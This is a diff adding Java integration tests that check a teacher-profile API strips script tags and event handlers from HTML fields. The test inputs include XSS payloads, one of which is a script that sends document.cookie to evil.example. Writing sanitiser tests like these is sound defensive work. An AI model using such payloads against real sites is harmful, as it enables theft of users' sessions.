@@ -494,4 +494,108 @@ public class TeacherIntegrationTest extends AbstractIntegrationTest {
 
         assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
     }
+
+    @Test
+    void createTeacher_WhenEducationContainsScript_StripsScriptAndKeepsFormatting() {
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Сидоров")
+                .firstName("Олег")
+                .position("профессор")
+                .education("<p>МГТУ <b>СТАНКИН</b>, 2010</p>"
+                        + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+        Teacher saved = teacherRepository.findAll().getFirst();
+        assertThat(saved.getEducation())
+                .doesNotContain("<script")
+                .contains("<b>СТАНКИН</b>");
+    }
+
+    @Test
+    void updateMyCard_WhenQualificationContainsEventHandler_StripsHandler() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .qualification("<p>Курс <img src=\"x\" onerror=\"alert(1)\"></p>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        Teacher updated = teacherRepository.findById(card.getId()).orElseThrow();
+        assertThat(updated.getQualification())
+                .doesNotContain("onerror")
+                .contains("<p>Курс");
+    }
+
+    @Test
+    void updateMyCard_WhenEducationIsOnlyForbiddenMarkup_SavesNull() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        card.setEducation("<p>МГТУ СТАНКИН</p>");
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .education("<script>alert(1)</script>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getEducation()).isNull();
+    }
+
+    @Test
+    void updateMyCard_WhenBioContainsMarkup_KeepsItVerbatim() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .bio("Научные интересы: <b>СУБД</b> и 5 < 7")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getBio())
+                .isEqualTo("Научные интересы: <b>СУБД</b> и 5 < 7");
+    }
 }
